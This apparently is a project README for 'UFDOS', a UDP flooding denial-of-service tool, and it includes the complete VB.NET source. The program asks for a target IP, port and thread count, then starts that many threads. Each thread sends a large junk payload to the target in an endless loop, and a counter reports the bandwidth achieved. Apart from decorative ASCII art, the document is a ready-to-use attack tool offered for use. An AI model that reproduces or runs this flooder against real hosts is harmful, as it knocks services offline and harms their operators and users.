# UFDOS
UFDOS is a UDP flooding tool ('U'dp 'F'looding 'DOS')
This tool is writen with VB2010
<h1>Code:</h1>

<code>Imports System.Threading, System.Net.Sockets
Imports System.Net
Imports System.Text</code>

    Public Module Module1
        Public UPSIS As Integer
        Sub Main()

        'UFDOS-1b_christmas2023_vbnet20231221_1
        '                                         ==                                            
        '                                        -**=                                           
        '                                   :--==****==--:                                      
        '                                    -**********=.                                      
        '                                     .+*******.                                        
        '                                     .+*******:                                        
        '                                    :=*+===++*+-                                       
        '                                  .--------======:                                     
        '                                 :---------========.                                   
        '                               .------------========:                                  
        '                              :-------------=+++======.                                
        '                            :--------------=****+======-                               
        '                           ----------------=****+========.                             
        '                         .------------------==++==========:                            
        '                         :-------------------=============-                            
        '                           ...--------================:::.                             
        '                             :-------=================-                                
        '                           .------------------==========.                              
        '                          :-------------------===========-                             
        '                        .-----==---------------====--======.                           
        '                       :----+****=--------------==----======-                          
        '                     .------+****=--------------==============.                        
        '                    :--------====----------------==============-                       
        '                  .----------------------::::----================:                     
        '                 :------------------------:::-----================-                    
        '                 ---------------------------------=================.                   
        '                 .:::-----------===============================---.                    
        '                    ------------================================.                      
        '                  .-------------=================================:                     
        '                 .-------------------=====----------==============:                    
        '                :-------------------=****+----------===============-                   
        '               ---------------------=****+-----------==--:--=========.                 
        '             .-------:::-------------=====-----------==:::::==========:                
        '            :-------:::::-----------------------------==----===========-               
        '           :------------------------------------------===================              
        '          ---------------------------------------------=================== 
        '          ---------------------------------------------=================== 
        '            .......................++++++++++++++:.......................  
        '                                   +++++++*******.
        '                                   +++++++*******.
        '                                   +++++++*******.
        '                                   +++++++*******.
        '                                   +++++++*******.
        '                                   +++++++******* 
        '                                   .=+++++*****+: 
        Console.SetWindowSize(105, 21)
        Console.WriteLine("+------------------------------------------------------------------------------------------------------+")
        Console.WriteLine("|UUUUUUUU     UUUUUUUUFFFFFFFFFFFFFFFFFFFFFFDDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS |")
        Console.WriteLine("|U::::::U     U::::::UF::::::::::::::::::::FD::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S|")
        Console.WriteLine("|U::::::U     U::::::UF::::::::::::::::::::FD:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S|")
        Console.WriteLine("|UU:::::U     U:::::UUFF::::::FFFFFFFFF::::FDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS|")
        Console.WriteLine("| U:::::U     U:::::U   F:::::F       FFFFFF  D:::::D    D:::::D O::::::O   O::::::OS:::::S            |")
        Console.WriteLine("| U:::::D     D:::::U   F:::::F               D:::::D     D:::::DO:::::O     O:::::OS:::::S            |")
        Console.WriteLine("| U:::::D     D:::::U   F::::::FFFFFFFFFF     D:::::D     D:::::DO:::::O     O:::::O S::::SSSS         |")
        Console.WriteLine("| U:::::D     D:::::U   F:::::::::::::::F     D:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS    |")
        Console.WriteLine("| U:::::D     D:::::U   F:::::::::::::::F     D:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  |")
        Console.WriteLine("| U:::::D     D:::::U   F::::::FFFFFFFFFF     D:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S |")
        Console.WriteLine("| U:::::D     D:::::U   F:::::F               D:::::D     D:::::DO:::::O     O:::::O            S:::::S|")
        Console.WriteLine("| U::::::U   U::::::U   F:::::F               D:::::D    D:::::D O::::::O   O::::::O            S:::::S|")
        Console.WriteLine("| U:::::::UUU:::::::U FF:::::::FF           DDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S|")
        Console.WriteLine("|  UU:::::::::::::UU  F::::::::FF           D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S|")
        Console.WriteLine("|    UU:::::::::UU    F::::::::FF           D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS |")
        Console.WriteLine("|      UUUUUUUUU      FFFFFFFFFFF           DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS   |")
        Console.WriteLine("+------------------------------------------------------------------------------------------------------+")
        Console.WriteLine("UFDOS-1b_christmas2023_vbnet20231221_1")
        Console.WriteLine("")
        Console.Write("IP Address:")
        Static IPADDR
        IPADDR = Console.ReadLine()
        Console.Write("Port:")
        Static PORT
        PORT = Console.ReadLine()
        Console.Write("Threads:")
        Static THREADS As Integer
        THREADS = Console.ReadLine()

        Console.WriteLine("Spawning threads(" & THREADS & ")")
        Dim TCNT As Integer
        TCNT = 0
        Do Until TCNT = THREADS
            TCNT = TCNT + 1
            Dim NThread As New Thread(Sub() IKUN(IPADDR, PORT))
            NThread.Start()

        Loop
        Dim NETCNT As New Thread(AddressOf SMALLBLACKZI)
        NETCNT.Start()
        Console.WriteLine("Done! Press ENTER to exit.")
        Console.ReadLine()
        End
    End Sub
    Public Sub IKUN(ByVal IPADDR, ByVal PORT)
        Dim udpClient As New UdpClient
        Dim GLOIP As IPAddress
        Dim GLOINTPORT As Integer
        Dim bytCommand As Byte() = New Byte() {}
        GLOIP = IPAddress.Parse(IPADDR)
        GLOINTPORT = PORT
        udpClient.Connect(GLOIP, GLOINTPORT)
        bytCommand = Encoding.ASCII.GetBytes("QWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyiQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jto0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.jQWERTYUIOqwertyuioASDFRTYUasdfwegwbk7348507969i6defgh#&()IUYGVBNFUI$YGCRFGUTYu4yyreuyito0948576ythgfjkidr9487yhgnfmdje,.nlpjh;.j")
        Do
            UPSIS = UPSIS + bytCommand.Length
            udpClient.Send(bytCommand, bytCommand.Length)

        Loop

    End Sub
    Public Sub SMALLBLACKZI()
        Do
            UPSIS = 0
            Thread.Sleep(1000)
            Console.WriteLine(UPSIS * 8 / 1000 / 1000 & "Mbps")
        Loop
    End Sub
End Module
</code>
